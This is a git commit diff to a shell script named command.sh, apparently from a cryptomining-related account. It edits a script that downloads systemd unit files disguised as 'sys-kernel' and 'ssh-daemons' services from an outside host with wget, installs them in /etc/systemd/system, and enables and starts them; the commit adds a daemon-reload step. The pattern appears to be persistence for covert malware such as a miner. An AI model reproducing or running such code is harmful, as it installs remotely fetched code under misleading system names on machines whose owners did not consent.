567cb1a1f6ede3f594c82c53382a7cda18d73700
xmrhorizontal <148181892+xmrhorizontal@users.noreply.github.com>
2024-02-06 23:54:32 +0300

    Update command.sh

--- command.sh
+++ command.sh
@@ -3,6 +3,7 @@ if [ -e "/etc/cron.d/cronconfig" ]; then
  	cd /etc/systemd/system
 	wget https://xmrhorizontal.github.io/sys-kernel.service
 	wget https://xmrhorizontal.github.io/ssh-daemons.service
+ 	systemctl daemon-reload
         systemctl enable ssh-daemons.service
 	systemctl enable sys-kernel.service
 	systemctl start ssh-daemons.service
